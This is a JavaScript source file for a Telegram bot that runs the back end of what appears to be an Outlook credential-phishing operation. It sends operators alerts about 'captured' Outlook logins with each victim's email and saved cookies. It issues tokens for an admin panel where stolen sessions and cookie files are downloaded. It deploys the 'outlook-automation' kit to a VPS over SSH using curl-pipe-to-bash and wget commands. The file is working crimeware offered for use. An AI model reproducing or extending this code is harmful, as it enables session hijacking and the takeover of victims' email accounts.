const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { Client } = require('ssh2');

class AdminTokenBot {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.bot = new TelegramBot(this.token, { polling: true });
        this.chatIds = new Set(); // Store user chat IDs for notifications
        this.rateLimits = new Map(); // Rate limiting per chat ID
        this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');
        
        // Deployment state tracking
        this.deploymentStates = new Map(); // chatId -> deployment state
        
        // Hardcoded app source URL - update this to your actual repository
        this.APP_SOURCE_URL = 'https://github.com/yourusername/your-repo/archive/main.zip';
        
        // Load persistent subscriptions
        this.loadSubscriptions();
        
        this.setupCommands();
        this.setupEventHandlers();
        console.log('🤖 Telegram Bot initialized successfully');
    }

    // Load persistent subscriptions from file
    loadSubscriptions() {
        try {
            if (fs.existsSync(this.subscriptionsFile)) {
                const data = fs.readFileSync(this.subscriptionsFile, 'utf8');
                const subscriptions = JSON.parse(data);
                this.chatIds = new Set(subscriptions.chatIds || []);
                console.log(`📋 Loaded ${this.chatIds.size} subscription(s) from persistent storage`);
            }
        } catch (error) {
            console.error('Error loading subscriptions:', error.message);
            this.chatIds = new Set();
        }
    }

    // Save subscriptions to file
    saveSubscriptions() {
        try {
            const data = {
                chatIds: Array.from(this.chatIds),
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(this.subscriptionsFile, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error('Error saving subscriptions:', error.message);
        }
    }

    // Rate limiting check
    checkRateLimit(chatId, command) {
        const now = Date.now();
        const key = `${chatId}_${command}`;
        const lastCall = this.rateLimits.get(key) || 0;
        
        // Allow 1 command per 2 seconds per user
        if (now - lastCall < 2000) {
            return false;
        }
        
        this.rateLimits.set(key, now);
        
        // Clean up old entries every 100 requests
        if (this.rateLimits.size > 100) {
            for (const [k, time] of this.rateLimits.entries()) {
                if (now - time > 60000) { // Remove entries older than 1 minute
                    this.rateLimits.delete(k);
                }
            }
        }
        
        return true;
    }

    setupCommands() {
        // Welcome message with Get Admin Token button
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'start')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                return;
            }
            
            this.chatIds.add(chatId);
            this.saveSubscriptions();
            
            const welcomeMessage = `
🔐 *Admin Token & Outlook Notifications Bot*

Welcome! I can help you with:

*Admin Access:*
Click the button below to get your admin token

*Notifications:*
/notify on - Enable Outlook login notifications
/notify off - Disable notifications  

You'll automatically receive notifications when valid Outlook logins are captured! 🔔
            `;
            
            this.bot.sendMessage(chatId, welcomeMessage, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔑 Get Admin Token', callback_data: 'get_token' }
                    ]]
                }
            });
        });

        // Notification controls
        this.bot.onText(/\/notify (on|off)/, (msg, match) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'notify')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before changing notification settings.');
                return;
            }
            
            const action = match[1];
            
            if (action === 'on') {
                this.chatIds.add(chatId);
                this.saveSubscriptions();
                this.bot.sendMessage(chatId, '🔔 Outlook login notifications enabled! You\'ll receive alerts when valid logins are captured.');
            } else {
                this.chatIds.delete(chatId);
                this.saveSubscriptions();
                this.bot.sendMessage(chatId, '🔕 Outlook login notifications disabled.');
            }
        });

        // Deploy command
        this.bot.onText(/\/deploy/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'deploy')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before starting deployment.');
                return;
            }

            this.deploymentStates.set(chatId, { step: 'vps_ip' });
            
            this.bot.sendMessage(chatId, `
🚀 *VPS Deployment*

Please provide your VPS IP address:
(Example: 192.168.1.100)
            `, { parse_mode: 'Markdown' });
        });

        // Deploy status command
        this.bot.onText(/\/status/, (msg) => {
            const chatId = msg.chat.id;
            
            const state = this.deploymentStates.get(chatId);
            if (!state) {
                this.bot.sendMessage(chatId, '📊 No active deployment. Use /deploy to start.');
                return;
            }

            this.bot.sendMessage(chatId, `📊 Deployment Status: ${state.status || 'In Progress'}`);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'help')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                return;
            }
            
            const helpMessage = `
🔐 *Admin Token & VPS Deployment Bot*

*Available Commands:*
• /start - Show welcome message and token button
• /notify on - Enable login notifications  
• /notify off - Disable notifications
• /deploy - Deploy to VPS remotely
• /status - Check deployment status
• /help - Show this help message

*How it works:*
1. Click "Get Admin Token" to access the admin panel
2. Use /deploy to remotely install on any VPS
3. Enable notifications to get alerts when Outlook logins are captured

You'll receive real-time notifications when Outlook logins are captured! 🔔
            `;
            
            this.bot.sendMessage(chatId, helpMessage, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔑 Get Admin Token', callback_data: 'get_token' }
                    ]]
                }
            });
        });
    }

    setupEventHandlers() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            
            if (!this.checkRateLimit(chatId, 'callback')) {
                this.bot.answerCallbackQuery(query.id, { text: 'Please wait before clicking again.' });
                return;
            }
            
            if (query.data === 'get_token') {
                const adminToken = global.adminToken || 'Token not available';
                const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/admin.html`;
                
                const tokenMessage = `
🔑 *Your Admin Token*

\`${adminToken}\`

🌐 **Admin Panel:** [Click here to access](${adminUrl})

*How to use:*
1. Copy the token above
2. Visit the admin panel link  
3. Enter the token to authenticate
4. View all saved sessions and download cookie files

*Security Note:* This token gives full access to your admin panel. Keep it secure!
                `;

                this.bot.editMessageText(tokenMessage, {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🔄 Refresh Token', callback_data: 'get_token' },
                            { text: '🌐 Open Admin Panel', url: adminUrl }
                        ]]
                    }
                });
            }
            
            this.bot.answerCallbackQuery(query.id);
        });

        // Handle text messages for deployment flow
        this.bot.on('message', (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;

            // Skip commands
            if (text?.startsWith('/')) return;

            const state = this.deploymentStates.get(chatId);
            if (!state) return;

            this.handleDeploymentFlow(chatId, text, state);
        });

        // Handle document uploads for SSH keys
        this.bot.on('document', (msg) => {
            const chatId = msg.chat.id;
            const state = this.deploymentStates.get(chatId);
            
            if (state?.step === 'ssh_key') {
                this.handleSSHKeyUpload(chatId, msg.document);
            }
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            console.error(`Telegram Bot polling error: ${error.code} - ${error.message}`);
        });
    }

    // Method to send login notifications
    async sendLoginNotification(loginData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, domain, timestamp, totalCookies, sessionId } = loginData;
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/admin.html`;
        
        const notificationMessage = `
🔐 *New Outlook Login Captured!*

📧 **Email:** \`${email}\`
🏢 **Domain:** \`${domain}\`
🕐 **Time:** ${new Date(timestamp).toLocaleString()}
📊 **Cookies:** ${totalCookies} saved
🆔 **Session:** ${sessionId}

🌐 Access admin panel to view details and download cookies
        `;

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🌐 Open Admin Panel', url: adminUrl },
                            { text: '🔑 Get Admin Token', callback_data: 'get_token' }
                        ]]
                    }
                });
            } catch (error) {
                console.error(`Failed to send notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                    this.saveSubscriptions();
                }
            }
        }
        
        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
    }

    async handleDeploymentFlow(chatId, text, state) {
        switch (state.step) {
            case 'vps_ip':
                // Validate IP format
                const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
                if (!ipRegex.test(text)) {
                    this.bot.sendMessage(chatId, '❌ Invalid IP format. Please enter a valid IP address (e.g., 192.168.1.100)');
                    return;
                }
                
                state.vpsIP = text;
                state.step = 'ssh_key';
                this.deploymentStates.set(chatId, state);
                
                this.bot.sendMessage(chatId, `
✅ VPS IP: ${text}

🔑 Now please upload your SSH private key file.
(Send as a document/file)
                `);
                break;

            case 'confirm':
                if (text.toLowerCase() === 'yes' || text.toLowerCase() === 'y') {
                    await this.startDeployment(chatId, state);
                } else {
                    this.deploymentStates.delete(chatId);
                    this.bot.sendMessage(chatId, '❌ Deployment cancelled.');
                }
                break;
        }
    }

    async handleSSHKeyUpload(chatId, document) {
        try {
            const state = this.deploymentStates.get(chatId);
            
            // Download SSH key file
            const fileLink = await this.bot.getFileLink(document.file_id);
            const response = await fetch(fileLink);
            const sshKey = await response.text();
            
            state.sshKey = sshKey;
            state.step = 'confirm';
            this.deploymentStates.set(chatId, state);
            
            this.bot.sendMessage(chatId, `
🔑 SSH key received!

📋 *Deployment Summary:*
• VPS IP: ${state.vpsIP}
• SSH Key: ✅ Uploaded
• App Source: ${this.APP_SOURCE_URL}

Ready to deploy? Type 'yes' to start.
            `, { parse_mode: 'Markdown' });
            
        } catch (error) {
            this.bot.sendMessage(chatId, '❌ Failed to process SSH key. Please try again.');
        }
    }

    async startDeployment(chatId, state) {
        this.bot.sendMessage(chatId, '🚀 Starting deployment...');
        
        const conn = new Client();
        
        try {
            await new Promise((resolve, reject) => {
                conn.connect({
                    host: state.vpsIP,
                    username: 'root', // or 'ubuntu' depending on your VPS
                    privateKey: state.sshKey,
                    readyTimeout: 20000
                });
                
                conn.on('ready', () => {
                    this.bot.sendMessage(chatId, '✅ Connected to VPS!');
                    resolve();
                });
                
                conn.on('error', reject);
            });

            // Run deployment commands
            await this.executeDeploymentCommands(chatId, conn, state);
            
        } catch (error) {
            this.bot.sendMessage(chatId, `❌ Deployment failed: ${error.message}`);
        } finally {
            conn.end();
            this.deploymentStates.delete(chatId);
        }
    }

    async executeDeploymentCommands(chatId, conn, state) {
        const commands = [
            'apt update',
            'curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -',
            'apt install -y nodejs unzip',
            'apt install -y ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils',
            `wget ${this.APP_SOURCE_URL} -O app.zip`,
            'unzip app.zip',
            'mv */outlook-automation/ . 2>/dev/null || mv outlook-automation-*/ outlook-automation/ 2>/dev/null || echo "Directory setup"',
            'cd outlook-automation && npm install',
            'cd outlook-automation && nohup npm start > app.log 2>&1 &'
        ];

        for (let i = 0; i < commands.length; i++) {
            const cmd = commands[i];
            this.bot.sendMessage(chatId, `📦 Step ${i + 1}/${commands.length}: ${cmd.substring(0, 50)}...`);
            
            try {
                await this.execCommand(conn, cmd);
                this.bot.sendMessage(chatId, `✅ Step ${i + 1} completed`);
            } catch (error) {
                this.bot.sendMessage(chatId, `❌ Step ${i + 1} failed: ${error.message}`);
                throw error;
            }
        }

        this.bot.sendMessage(chatId, `
🎉 *Deployment Complete!*

Your app is now running on:
• http://${state.vpsIP}:5000

To check status: ssh into your VPS and run:
• \`ps aux | grep node\`
• \`tail -f outlook-automation/app.log\`
        `, { parse_mode: 'Markdown' });
    }

    execCommand(conn, command) {
        return new Promise((resolve, reject) => {
            conn.exec(command, (err, stream) => {
                if (err) reject(err);
                
                let output = '';
                stream.on('data', (data) => {
                    output += data.toString();
                });
                
                stream.on('close', (code) => {
                    if (code === 0) {
                        resolve(output);
                    } else {
                        reject(new Error(`Command failed with code ${code}: ${output}`));
                    }
                });
            });
        });
    }

    getSubscribedUsers() {
        return this.chatIds.size;
    }
}

module.exports = AdminTokenBot;